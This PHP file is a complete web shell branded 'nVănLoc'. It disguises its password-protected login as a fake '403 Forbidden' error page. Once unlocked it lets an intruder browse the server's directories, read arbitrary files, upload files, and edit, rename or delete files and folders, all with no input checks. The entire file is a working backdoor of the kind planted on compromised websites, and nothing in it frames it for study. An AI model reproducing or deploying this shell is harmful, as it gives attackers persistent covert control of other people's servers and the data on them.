<?php
$admin = "a2ac75e6e5d601f92a5ba0d2c96658f5";
session_start();
set_time_limit(0);
error_reporting(0);
clearstatcache();
function Login() {
    $SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
    echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access this resource.</p><hr>".$SERVER_SIG."</body></html><form method='post'><input style='margin:0;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form>";
    exit;
    }
    
    if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
        if( empty($admin) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $admin) ) )
            $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        else
            Login();
if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){$_POST[$key] = stripslashes($value);}}
?>
<!DOCTYPE html><html><head><link href="" rel="stylesheet" type="text/css"><title>nVănLoc</title>
<link href='https://fonts.googleapis.com/css?family=VT323' rel='stylesheet'>
<style type="text/css">body{background: #0f172a;color:#eceff1;font-family:'Courier';margin:0;font-size: 14px;}h1{font-family:'VT323';font-weight:normal;font-size:60px;margin:0;}h1:hover{color:#ffee58;}select{background:#10b981;color:#eceff1;}a{color:#10b981;text-decoration:none;font-family:'Courier'}textarea{width:900px;height:250px;background:transparent;border:1px dashed #10b981;color:#10b981;padding:2px;}tr.first{border-bottom:1px dashed #10b981;}tr:hover{background: #7f2e00;}th{background: #10b981;padding:5px;}</style>
</head><body> <?php echo'<div style="color:#10b981;margin-top:0;"><h1><center>nVănLoc</center></h1></div>';
if(isset($_GET['path'])) {$path = $_GET['path'];chdir($_GET['path']);} else {$path = getcwd();}
$path = str_replace("\\","/",$path);$paths = explode("/", $path);
echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td>';echo "<font style='font-size:13px;'>Path: ";
foreach($paths as $id => $pat) {echo "<a style='font-size:13px;' href='?path=";
for($i = 0; $i <= $id; $i++) {echo $paths[$i];
if($i != $id) {echo "/";} }echo "'>$pat</a>/";}
echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#10b981;margin-bottom:4px;"/>
<input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<center><font color="#dc2626">Upload OK!.</font></center><br/>';}
else{echo '<center><font color="red">Upload Failed!.</font></center><br/>';}}
echo '</td></tr><tr><td></table>';
if(isset($_GET['filesrc'])){
echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';echo "".basename($_GET['filesrc']);"";echo '</tr></td></table><br />';echo("<center><textarea readonly=''>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea></center>");}
elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<center><font color="#dc2626">Rename OK!</font></center><br />';
}else{
echo '<center><font color="red">Rename Failed!</font></center><br />';
} $_POST['name'] = $_POST['newname'];}
echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');if(fwrite($fp,$_POST['src'])){echo '<center><font color="#dc2626">Edit File OK!.</font></center><br />';
}else{echo '<center><font color="red">Edit File Failed!.</font></center><br />';}fclose($fp);}
echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';}echo '</center>';}else{echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<center><font color="#dc2626">Dir Deleted!</font></center><br />';
}else{echo '<center><font color="red">Delete Dir Failed!</font></center><br />';}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){echo '<font color="#dc2626">Delete File Done.</font><br />';}else{
echo '<font color="red">Delete File Error.</font><br />';}}}echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first">
<th><center>Name</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th>
<th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>';
foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr><td>[D] <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
if(is_writable("$path/$dir")) echo '<font color="#dc2626">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
echo"</center></td><td><center>".date("d-M-Y H:i", filemtime("$path/$dir"))."";echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
foreach($scandir as $file){if(!is_file("$path/$file")) continue;$size = filesize("$path/$file")/1024;
$size = round($size,3);if($size >= 1024){$size = round($size/1024,2).' MB';}else{$size = $size.' KB';}
echo "<tr><td>[F] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>".$size."</center></td><td><center>";
if(is_writable("$path/$file")) echo '<font color="#dc2626">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo"</center></td><td><center>".date("d-M-Y H:i",filemtime("$path/$file"))."";
echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
echo '</table></div>';}echo '</body></html>';
function perms($file){$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';} $info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));$info .= (($perms & 0x0004) ? 'r' : '-');$info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));return $info;}
echo'<br><center>&copy; 2023 - nVănLoc.</center><br>';?>